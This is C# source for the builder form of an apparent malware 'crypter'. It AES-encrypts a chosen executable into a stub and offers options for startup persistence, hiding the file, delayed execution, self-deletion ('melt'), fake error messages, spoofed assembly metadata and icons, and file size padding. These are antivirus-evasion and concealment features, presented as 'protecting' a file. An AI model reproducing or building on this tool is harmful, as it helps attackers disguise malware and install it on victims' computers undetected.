using System;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Resources;


namespace CrypterExample
{
    public partial class Form1 : Form
    {
        public static string IconLoc = string.Empty;
        public Form1()
        {
            InitializeComponent();
        }

        private void pumpup(string location)
        {
            double num = Convert.ToDouble(this.numPump.Value) * 1024.0;
            FileStream stream = File.OpenWrite(location);
            for (long i = stream.Seek(0L, SeekOrigin.End); i < num; i += 1L)
            {
                stream.WriteByte(0);
            }
            stream.Close();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog FOpen = new OpenFileDialog()
            {
                Filter = "Executable Files|*.exe",
                InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            };

            if (FOpen.ShowDialog() == DialogResult.OK)
                textBox1.Text = FOpen.FileName;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            OpenFileDialog FOpen = new OpenFileDialog()
            {
                Filter = "Icon Files|*.ico",
                InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            };
            if (FOpen.ShowDialog() == DialogResult.OK)
            {
                this.pictureBox1.Image = Icon.ExtractAssociatedIcon(FOpen.FileName).ToBitmap();
                IconLoc = FOpen.FileName;
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            textBox3.Text = RandomString(30);
        }

        private string RandomString(int length)
        {
            string pool = "abcdefghijklmnopqrstuvwxyz";
            pool += pool.ToUpper();
            string tmp = "";
            Random R = new Random();
            for (int x = 0; x < length; x++)
            {
                tmp += pool[R.Next(0, pool.Length)].ToString();
            }
            return tmp;
        }

        private void button4_Click(object sender, EventArgs e)
        {
            SaveFileDialog FSave = new SaveFileDialog()
            {
                FileName = textBox4.Text,
                Title = "Save encrypted .exe",
                Filter = "Executable Files|*.exe",
                InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) 
            };
            if (FSave.ShowDialog() == DialogResult.OK)
            {
                // We read the source of the stub from the resources
                // and we're storing it into a variable.
                string Source = Properties.Resources.Stub;

                // Start timer for progressbar
                this.timer1.Start();

                // Assembly replace
                Source = Source.Replace("[assembly-title]", textBox8.Text);
                Source = Source.Replace("[assembly-description]", textBox9.Text);
                Source = Source.Replace("[assembly-company]", textBox11.Text);
                Source = Source.Replace("[assembly-product]", textBox7.Text);
                Source = Source.Replace("[assembly-copyright]", textBox6.Text);
                Source = Source.Replace("[assembly-version]", textBox2.Text);

                // If the user picked a storage method (he obviously did)
                // then replace the value on the source of the stub
                // that will later tell the stub from where it should
                // read the bytes.
                if (radioButton1.Checked)
                    // User picked native resources method.
                    Source = Source.Replace("[storage-replace]", "native");
                else
                    // User picked managed resources method.
                    Source = Source.Replace("[storage-replace]", "managed");

                // Check to see if the user enabled startup
                // and replace the boolean value in the stub
                // which indicates if the crypted file should
                // add itself to startup
                if (checkBox1.Checked)
                    // User enabled startup.
                    Source = Source.Replace("[startup-replace]", "true");
                else
                    // User did not enable startup.
                    Source = Source.Replace("[startup-replace]", "false");

                // Check to see if the user enabled hide file
                // and replace the boolean value in the stub
                // which indicates if the crypted file should hide itself
                if (checkBox2.Checked)
                    // User enabled hide file.
                    Source = Source.Replace("[hide-replace]", "true");
                else
                    // User did not enable hide file.
                    Source = Source.Replace("[hide-replace]", "false");

                if (checkBox11.Checked)
                    // User enabled copy file.
                    Source = Source.Replace("[copy-replace]", "true");
                else
                    // User did not enable copy
                    Source = Source.Replace("[copy-replace]", "false");

                if (numDelay.Value > 0)
                {
                    // User enabled copy file.
                    Source = Source.Replace("[delay-replace]", "true");
                    Source = Source.Replace("[delay-time-replace]", numDelay.Value.ToString() + "000");
                }
                else
                { 
                    // User did not enable copy
                    Source = Source.Replace("[delay-replace]", "false");
                    Source = Source.Replace("[delay-time-replace]", numDelay.Value.ToString() + "000");
                }

                if (checkBox12.Checked)
                    // User enabled melt file.
                    Source = Source.Replace("[melt-replace]", "true");
                else
                    // User did not enable melt file
                    Source = Source.Replace("[melt-replace]", "false");

                if (msgTitle.Text != "")
                {
                    // Show fake error message
                    Source = Source.Replace("[fake-replace]", "true");
                    Source = Source.Replace("[fake-title-replace]", msgTitle.Text);
                    Source = Source.Replace("[fake-body-replace]", msgBody.Text);
                }
                else
                    // Don't show error message
                    Source = Source.Replace("[fake-replace]", "false");

                // Replace the encryption key in the stub
                // as it will be used by it in order to
                // decrypt the encrypted file.
                Source = Source.Replace("[key-replace]", textBox3.Text);

                // Name replace
                Source = Source.Replace("[name-replace]", textBox4.Text);

                // Read the bytes of the file the user wants to crypt.
                byte[] FileBytes = File.ReadAllBytes(textBox1.Text);

                // Encrypt the file using the AES encryption algorithm.
                // The key is the random string the user generated.
                byte[] EncryptedBytes = Encryption.AESEncrypt(FileBytes, textBox3.Text);

                // Write all the text to file for DEBUG
                File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "/source.txt", Source);

                // Compile the file according to the storage method the user picked.
                // We also declare a variable to store the result of the compilation.
                bool success;

                if (radioButton1.Checked) /* User picked native resources method */
                {
                    // Check if the user picked an icon file and if it exists.
                    if (File.Exists(IconLoc))
                        // Compile with an icon.
                        success = Compiler.CompileFromSource(Source, FSave.FileName, IconLoc);
                    else
                        // Compile without an icon.
                        success = Compiler.CompileFromSource(Source, FSave.FileName);

                    Writer.WriteResource(FSave.FileName, EncryptedBytes);
                }
                else
                {
                    // The user picked the managed resource method so we'll create
                    // a resource file that will contain the bytes. Then we will
                    // compile the stub and add that resource file to the compiled
                    // stub.
                    string ResFile = Path.Combine(Application.StartupPath, "Encrypted.resources");

                    using (ResourceWriter Writer = new ResourceWriter(ResFile))
                    {
                        // Add the encrypted bytes to the resource file.
                        Writer.AddResource("encfile", EncryptedBytes);
                        // Generate the resource file.
                        Writer.Generate();
                    }

                    // Check if the user picked an icon file and if it exists.
                    if (File.Exists(IconLoc))
                        // Compile with an icon.
                        success = Compiler.CompileFromSource(Source, FSave.FileName, IconLoc, new string[] { ResFile });
                    else
                        // Compile without an icon.
                        success = Compiler.CompileFromSource(Source, FSave.FileName, null, new string[] { ResFile });
                
                    // Now that the stub was compiled, we delete
                    // the resource file since we don't need it anymore.
                    File.Delete(ResFile);
                }
                if (success)
                {
                    MessageBox.Show("Your file has been successfully protected.","Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }

                // If filepumper is more then 0 then apply
                if (numPump.Value > 0M)
                {
                    pumpup(FSave.FileName);
                }
            }
        }

        // Copyright link
        private void toolStripStatusLabel1_Click(object sender, EventArgs e)
        {
            // Visit website
            System.Diagnostics.Process.Start("http://www.bdekker.nl");
        }

        // Timer for progressbar
        private void timer1_Tick(object sender, EventArgs e)
        {
            toolStripProgressBar1.Increment(20);
            if (toolStripProgressBar1.Value == 100)
            {
                toolStripProgressBar1.Value = 0;
                timer1.Enabled = false;
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            MessageBox.Show(msgBody.Text, msgTitle.Text, MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
    }
}
